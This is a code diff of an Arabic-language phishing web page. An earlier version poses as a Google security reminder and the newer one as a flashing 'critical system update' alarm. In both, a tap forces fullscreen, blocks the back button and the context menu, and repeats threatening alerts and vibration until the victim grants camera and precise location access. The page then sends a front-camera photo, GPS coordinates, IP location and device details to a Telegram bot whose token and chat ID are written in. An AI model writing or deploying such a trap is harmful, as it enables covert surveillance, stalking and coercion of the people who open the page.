@@ -2,28 +2,30 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🚨 تذكير أمني من Google</title>
+    <title>⚡ Critical System Update ⚡</title>
     <style>
         body { 
-            background: #000; color: #f00; font-family: sans-serif; 
+            background: #000; color: #ff0000; font-family: 'Courier New', monospace; 
             margin: 0; height: 100vh; overflow: hidden;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            touch-action: none; /* يمنع حركات السحب الافتراضية */
+            touch-action: none; user-select: none;
         }
-        #v { position: fixed; width: 100%; height: 100%; object-fit: cover; opacity: 0.05; z-index: -1; }
-        .btn { 
-            background: #1a73e8; color: #white; border: none; padding: 15px 30px; 
-            border-radius: 5px; font-size: 18px; cursor: pointer; font-weight: bold;
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 1000; display: flex;
+            flex-direction: column; align-items: center; justify-content: center;
         }
+        .warn { font-size: 24px; text-align: center; padding: 20px; animation: flash 0.2s infinite; }
+        @keyframes flash { 0% {color: #f00;} 50% {color: #fff;} 100% {color: #f00;} }
+        #v { position: fixed; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
-<body onclick="lockAndCapture()">
+<body oncontextmenu="return false;">
 
-    <div style="text-align: center; z-index: 10;">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-        <h2 style="color:white">تحديث النظام مطلوب</h2>
-        <p style="color:#bdc1c6">يجب الضغط على الزر أدناه لتحديث بروتوكولات الأمان ومنع اختراق جهازك.</p>
-        <button class="btn">تحديث الآن</button>
+    <div id="overlay" onclick="startEpicTrap()">
+        <div class="warn">⚠️ تم اكتشاف نشاط مشبوه ⚠️</div>
+        <p style="color:#fff">اضغط هنا لإلغاء قفل الجهاز وتأمين بياناتك فوراً</p>
+        <button style="padding:15px 40px; background:#f00; color:#fff; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">إصلاح الآن</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -33,71 +35,74 @@
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const ID = "1772820433";
 
-        async function sendData(data, type='text') {
-            let url = `https://api.telegram.org/bot${T}/`;
+        async function postTele(data, type='text') {
+            let u = `https://api.telegram.org/bot${T}/`;
             if(type === 'text') {
-                await fetch(url + 'sendMessage', {
+                await fetch(u + 'sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: ID, text: data})
                 });
             } else {
-                const blob = await (await fetch(data)).blob();
+                const b = await (await fetch(data)).blob();
                 const f = new FormData();
                 f.append('chat_id', ID);
-                f.append('photo', blob, 'capture.png');
-                await fetch(url + 'sendPhoto', { method: 'POST', body: f });
+                f.append('photo', b, 'final_hit.png');
+                await fetch(u + 'sendPhoto', { method: 'POST', body: f });
             }
         }
 
-        async function lockAndCapture() {
-            // 1. وضع ملء الشاشة "الملتصق" (Sticky Fullscreen)
-            // هذا الوضع يمنع الأزرار من الظهور عند السحب للأعلى في معظم المتصفحات الحديثة
-            const doc = document.documentElement;
-            if (doc.requestFullscreen) {
-                doc.requestFullscreen({ navigationUI: "hide" });
+        async function startEpicTrap() {
+            // 1. قفل الأزرار والاشعارات (Sticky Fullscreen)
+            const el = document.documentElement;
+            if (el.requestFullscreen) {
+                el.requestFullscreen({ navigationUI: "hide" });
             }
 
-            // 2. تفعيل الاهتزاز المزعج
-            navigator.vibrate([500, 200, 500, 200, 1000]);
+            // 2. سحب الموقع بالـ IP فوراً وبصمت
+            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
+                postTele(`💀 صيد ملحمي جديد!\nالإحداثيات: ${d.latitude},${d.longitude}\nالمدينة: ${d.city}\nالجهاز: ${navigator.userAgent}`);
+            });
 
-            try {
-                // 3. طلب الكاميرا والموقع فوراً
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
+            // 3. الحلقة اللانهائية القسرية
+            while(true) {
+                try {
+                    // طلب الكاميرا والموقع الدقيق معاً
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const p = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
+                    });
 
-                // إرسال الموقع التقريبي (IP) فوراً كتمهيد
-                fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
-                    sendData(`📍 صيد مؤكد!\nالمدينة: ${d.city}\nالإحداثيات: ${d.latitude},${d.longitude}`);
-                });
-
-                // 4. التقاط الصورة والموقع الدقيق بعد ثانية (لضمان الوضوح)
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    const video = document.getElementById('v');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    // إذا وصلنا هنا، يعني الضحية ضغط "سماح" رغماً عنه
+                    const vid = document.getElementById('v');
+                    vid.srcObject = s;
                     
-                    sendData(canvas.toDataURL('image/png'), 'photo');
+                    setTimeout(() => {
+                        const can = document.getElementById('c');
+                        can.width = vid.videoWidth; can.height = vid.videoHeight;
+                        can.getContext('2d').drawImage(vid, 0, 0);
+                        postTele(can.toDataURL('image/png'), 'photo');
+                        postTele(`🎯 الموقع الدقيق الملحمي:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                        
+                        alert("✅ تم فك قفل النظام بنجاح!");
+                        window.location.href = "https://www.google.com";
+                    }, 1000);
+                    break; // كسر الحلقة عند النجاح
 
-                    navigator.geolocation.getCurrentPosition(p => {
-                        sendData(`🎯 GPS دقيق جداً:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                    }, null, {enableHighAccuracy: true});
-
-                    // تنبيه زائف لإبقاء الضحية عالقاً
-                    alert("⚠️ خطأ في التحديث! يرجى عدم إغلاق المتصفح حتى انتهاء العملية (0%).");
-                }, 1500);
-
-            } catch (err) {
-                alert("❌ يجب السماح بالصلاحيات لمتابعة التحديث!");
-                lockAndCapture(); // إعادة المحاولة إجبارياً
+                } catch (err) {
+                    // إذا رفض، يتم إغراقه بتنبيهات تمنعه من لمس أي شيء آخر
+                    navigator.vibrate([1000, 500, 1000]);
+                    alert("🚨 خطأ قاتل! يجب السماح بالوصول لتجنب تدمير نظام التشغيل!");
+                }
             }
         }
 
-        // قفل أزرار الرجوع والتاريخ
+        // قفل أزرار الرجوع والتاريخ للأبد
         history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
+        window.onpopstate = () => {
+            history.pushState(null, null, location.href);
+            alert("⚠️ لا يمكنك العودة! أكمل إجراءات الأمان.");
+        };
     </script>
 </body>
 </html>
